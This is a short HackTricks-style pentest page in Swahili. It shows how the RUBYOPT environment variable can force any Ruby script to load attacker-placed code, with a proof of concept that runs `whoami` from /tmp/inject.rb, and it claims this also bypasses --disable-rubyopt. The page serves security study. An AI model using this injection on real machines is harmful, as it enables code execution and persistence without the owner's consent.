# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Kwa kutumia env variable hii, inawezekana **kuongeza params mpya** kwenye **ruby** kila inapotekelezwa. Ingawa param **`-e`** haiwezi kutumiwa kubainisha ruby code ya kutekeleza, inawezekana kutumia params **`-I`** na **`-r`** kuongeza folder mpya kwenye library load path, kisha **kubainisha library ya kupakia**.

Create library **`inject.rb`** ndani ya **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Unda popote script ya Ruby kama vile:
```ruby:hello.rb
puts 'Hello, World!'
```
Kisha fanya script ya ruby ya kiholela kuipakia kwa:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Ukweli wa kuvutia, inafanya kazi hata kwa param **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
